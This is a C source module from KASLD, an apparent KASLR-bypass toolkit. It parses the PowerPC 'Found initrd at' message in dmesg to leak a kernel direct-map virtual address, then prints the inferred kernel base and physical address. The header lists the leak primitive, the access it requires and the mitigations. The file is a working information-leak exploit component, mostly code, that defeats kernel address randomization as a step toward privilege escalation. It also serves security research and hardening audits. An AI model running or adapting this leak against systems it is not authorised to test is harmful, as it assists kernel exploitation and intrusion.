// This file is part of KASLD - https://github.com/bcoles/kasld
//
// check_for_initrd() prints initrd start address during boot:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
//
// ppc64:
// [    0.000000] Found initrd at 0xc000000001a00000:0xc000000002a26000
//
// Leak primitive:
//   Data leaked:      initrd physical/virtual load address
//   Kernel subsystem: arch/powerpc/kernel — check_for_initrd()
//   Data structure:   initrd_start / initrd_end (kernel virtual addresses)
//   Address type:     virtual (kernel direct-map, ppc64)
//   Method:           parsed (dmesg string)
//   Status:           unfixed (boot message printed unconditionally)
//   Access check:     do_syslog() → check_syslog_permissions(); gated by
//                     dmesg_restrict
//   Source:
//   https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
//
// Mitigations:
//   CONFIG_BLK_DEV_INITRD=n prevents the message. Access gated by
//   dmesg_restrict (see dmesg.h for shared access gate details).
//
// Requires:
// - CONFIG_BLK_DEV_INITRD=y
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN("Searches dmesg for the PowerPC check_for_initrd() message that "
              "prints the initrd start virtual address. On ppc64, this is a "
              "direct-map (linear map) virtual address that reveals the kernel "
              "PAGE_OFFSET. Access is gated by dmesg_restrict.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "sysctl:dmesg_restrict>=1\n"
           "bypass:CAP_SYSLOG\n"
           "fallback:/var/log/dmesg\n"
           "config:CONFIG_BLK_DEV_INITRD\n");

static const char *needle = "Found initrd at 0x";

static int on_match(const char *line, void *ctx) {
  unsigned long *result = ctx;
  const char *p = strstr(line, needle);
  if (!p)
    return 1;

  char *endptr;
  unsigned long addr = strtoul(p + strlen(needle), &endptr, 16);
  if (addr && addr < KERNEL_VAS_END) {
    *result = addr;
    return 0; /* stop after first match */
  }
  return 1;
}

int main(void) {
  unsigned long addr = 0;

  printf("[.] searching dmesg for check_for_initrd() info ...\n");
  int ds = dmesg_search(needle, on_match, &addr);

  if (!addr) {
    if (ds < 0)
      return KASLD_EXIT_NOPERM;
    printf("[-] check_for_initrd info not found in dmesg\n");
    return 0;
  }

  printf("leaked initrd start: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, addr,
               KASLD_REGION_INITRD, NULL);
#if !PHYS_VIRT_DECOUPLED
  {
    unsigned long phys = virt_to_phys(addr);
    printf("  possible physical address: 0x%016lx\n", phys);
    kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, phys, KASLD_REGION_INITRD,
                 NULL);
  }
#endif

  return 0;
}
